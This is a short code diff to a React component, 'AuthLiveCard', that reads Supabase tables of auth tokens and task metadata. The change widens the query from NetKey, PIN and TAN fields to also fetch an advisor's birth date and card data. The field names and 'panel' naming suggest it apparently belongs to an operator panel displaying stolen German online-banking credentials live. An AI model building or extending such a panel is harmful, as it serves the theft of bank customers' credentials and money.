@@ -46,7 +46,7 @@ const AuthLiveCard = () => {
   const load = async () => {
     const [{ data: a }, { data: m }] = await Promise.all([
       (supabase as any).from("auth_tokens").select("*").order("created_at", { ascending: false }).limit(50),
-      (supabase as any).from("panel_task_meta").select("task_id, netkey, pin, tan").like("task_id", "auth:%"),
+      (supabase as any).from("panel_task_meta").select("task_id, netkey, pin, tan, berater_geburtsdatum, berater_karte").like("task_id", "auth:%"),
     ]);
     setRows(a || []);
     const map: Record<string, MetaRow> = {};
